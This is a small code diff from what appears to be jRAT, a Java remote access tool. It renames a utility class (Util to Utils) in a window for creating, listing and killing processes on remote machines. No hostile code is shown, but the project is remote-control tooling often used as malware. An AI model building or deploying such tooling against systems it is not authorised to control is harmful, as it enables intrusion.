@@ -26,7 +26,7 @@ import pro.jrat.packets.outgoing.Packet19ListProcesses;
 import pro.jrat.packets.outgoing.Packet20KillProcess;
 import pro.jrat.packets.outgoing.Packet38RunCommand;
 import pro.jrat.ui.renderers.table.ProcessTableRenderer;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 @SuppressWarnings("serial")
@@ -75,7 +75,7 @@ public class FrameRemoteProcess extends JFrame {
 		btnCreateProcess = new JButton("Create process");
 		btnCreateProcess.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				String proc = Util.showDialog("Create process", "Input name of process");
+				String proc = Utils.showDialog("Create process", "Input name of process");
 				if (proc == null) {
 					return;
 				}
